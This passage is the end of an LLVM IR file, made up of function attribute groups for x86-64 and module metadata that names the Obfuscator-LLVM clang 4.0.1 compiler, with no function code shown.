attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146816763}
!2 = !{i32 -2146816354}
